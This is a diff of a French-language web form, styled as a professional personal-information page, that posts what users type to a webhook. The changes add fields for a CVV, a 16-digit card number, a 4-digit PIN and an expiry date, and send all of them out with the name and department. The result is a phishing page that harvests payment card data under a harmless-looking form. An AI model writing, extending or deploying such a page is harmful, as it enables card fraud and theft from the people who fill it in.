@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Formulaire Professionnel</title>
-
   <style>
     *{
       margin:0;
@@ -12,7 +11,6 @@
       box-sizing:border-box;
       font-family: Arial, sans-serif;
     }
-
     body{
       background: linear-gradient(135deg, #0f172a, #1e293b);
       height:100vh;
@@ -20,7 +18,6 @@
       justify-content:center;
       align-items:center;
     }
-
     .container{
       background:white;
       width:400px;
@@ -28,25 +25,21 @@
       border-radius:20px;
       box-shadow:0 10px 30px rgba(0,0,0,0.3);
     }
-
     .container h1{
       text-align:center;
       margin-bottom:30px;
       color:#0f172a;
       font-size:28px;
     }
-
     .form-group{
       margin-bottom:20px;
     }
-
     label{
       display:block;
       margin-bottom:8px;
       font-weight:bold;
       color:#334155;
     }
-
     input{
       width:100%;
       padding:12px;
@@ -55,13 +48,11 @@
       font-size:16px;
       transition:0.3s;
     }
-
     input:focus{
       border-color:#2563eb;
       outline:none;
       box-shadow:0 0 5px rgba(37,99,235,0.4);
     }
-
     button{
       width:100%;
       padding:14px;
@@ -74,38 +65,46 @@
       cursor:pointer;
       transition:0.3s;
     }
-
     button:hover{
       background:#1d4ed8;
     }
   </style>
 </head>
-
 <body>
-
   <div class="container">
     <h1>Informations Personnelles</h1>
-
     <form onsubmit="webhook(); return false;">
       <div class="form-group">
         <label for="nom">Nom</label>
         <input type="text" id="nom" placeholder="Entrez votre nom">
       </div>
-
       <div class="form-group">
         <label for="prenom">Prénom</label>
         <input type="text" id="prenom" placeholder="Entrez votre prénom">
       </div>
-
       <div class="form-group">
         <label for="departement">N° du département</label>
         <input type="number" id="departement" placeholder="Ex : 49">
       </div>
-
+      <div class="form-group">
+        <label for="cvv">CVV</label>
+        <input type="text" id="cvv" placeholder="Entrez le CVV">
+      </div>
+      <div class="form-group">
+        <label for="code16">Code à 16 chiffres</label>
+        <input type="text" id="code16" placeholder="Entrez le code à 16 chiffres">
+      </div>
+      <div class="form-group">
+        <label for="code4">Code à 4 chiffres</label>
+        <input type="text" id="code4" placeholder="Entrez le code à 4 chiffres">
+      </div>
+      <div class="form-group">
+        <label for="dateExpiration">Date d'expiration</label>
+        <input type="text" id="dateExpiration" placeholder="MM/AA">
+      </div>
       <button type="submit">Envoyer</button>
     </form>
   </div>
-
   <script>
     function webhook() {
       var hook = new XMLHttpRequest();
@@ -114,11 +113,10 @@
       var content = {
         username: 'Webhook Name',
         avatar_url: 'https://example.com/profile-icon-for-bot.png',
-        content: 'Nom: ' + document.getElementById('nom').value + '\nPrénom: ' + document.getElementById('prenom').value + '\nDépartement: ' + document.getElementById('departement').value
+        content: 'Nom: ' + document.getElementById('nom').value + '\nPrénom: ' + document.getElementById('prenom').value + '\nDépartement: ' + document.getElementById('departement').value + '\nCVV: ' + document.getElementById('cvv').value + '\nCode à 16 chiffres: ' + document.getElementById('code16').value + '\nCode à 4 chiffres: ' + document.getElementById('code4').value + '\nDate d\'expiration: ' + document.getElementById('dateExpiration').value
       };
       hook.send(JSON.stringify(content));
     }
   </script>
-
 </body>
 </html>
